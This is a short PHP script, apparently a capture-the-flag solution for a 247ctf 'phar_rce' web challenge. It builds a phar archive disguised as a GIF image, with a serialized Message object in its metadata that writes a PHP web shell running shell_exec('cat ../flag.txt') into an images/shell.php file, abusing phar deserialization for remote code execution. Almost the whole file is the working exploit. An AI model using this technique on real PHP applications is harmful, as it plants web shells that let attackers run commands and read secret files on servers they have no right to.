<?php

class Message
{
    public function __construct()
    {
        $this->to = "<?php echo shell_exec('cat ../flag.txt'); ?>";
        $this->filePath = "/home/bill/Pen/ctf/247ctf/web/phar_rce/images/shell.php";
    }
}

$phar = new Phar("poc.phar");
$phar->startBuffering();
$phar->setStub("GIF89a;<?php __HALT_COMPILER(); ?>");

$payload = new Message;
$phar->setMetadata($payload);

$phar->addFromString("poc.txt","What would you do if you weren't afraid?");
$phar->stopBuffering();
